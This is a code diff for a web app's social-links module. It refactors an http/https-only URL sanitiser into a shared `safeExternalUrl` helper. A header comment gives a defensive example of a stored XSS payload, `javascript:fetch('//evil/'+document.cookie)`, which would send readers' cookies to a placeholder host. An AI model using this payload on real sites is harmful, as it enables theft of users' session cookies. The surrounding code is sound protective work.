@@ -24,9 +24,12 @@
  * does **not** neutralise a scheme. An editor account (or anyone who reaches one)
  * could store `javascript:fetch('//evil/'+document.cookie)` and every reader who
  * clicked the footer's Facebook icon would run it, on our own origin.
- * `docs/security.md` §6 names stored input as the primary XSS vector, so only
- * `http:` and `https:` are allowed through and anything else is dropped.
+ *
+ * The check itself lives in `lib/url.ts` (`safeExternalUrl`) because the
+ * fact-check sources need exactly the same rule — one implementation, one place
+ * to get it right.
  */
+import { safeExternalUrl } from './url'
 
 /** The platforms the CMS exposes, in the order they should be displayed. */
 const PLATFORMS = [
@@ -46,27 +49,6 @@ export interface SocialLink {
 }
 
 /**
- * Accept a value only if it is a real `http`/`https` URL.
- *
- * Returns `''` for anything else, so the caller can filter it out rather than
- * render a dead or dangerous link.
- */
-function safeUrl(value: unknown): string {
-  if (typeof value !== 'string') return ''
-  const trimmed = value.trim()
-  if (!trimmed) return ''
-
-  try {
-    const parsed = new URL(trimmed)
-    return parsed.protocol === 'https:' || parsed.protocol === 'http:' ? trimmed : ''
-  } catch {
-    // Not an absolute URL at all — a bare handle like "shikkha24" is a common
-    // thing for an editor to type, and it must not become an href.
-    return ''
-  }
-}
-
-/**
  * Normalise the CMS `social` group into the ordered, renderable list.
  *
  * Absent, blank and invalid entries are dropped, so a surface can render
@@ -78,7 +60,7 @@ export function socialLinks(social: unknown): SocialLink[] {
   const record = social as Record<string, unknown>
 
   return PLATFORMS.flatMap(({ key, label }) => {
-    const url = safeUrl(record[key])
+    const url = safeExternalUrl(record[key])
     return url ? [{ platform: key, label, url }] : []
   })
 }
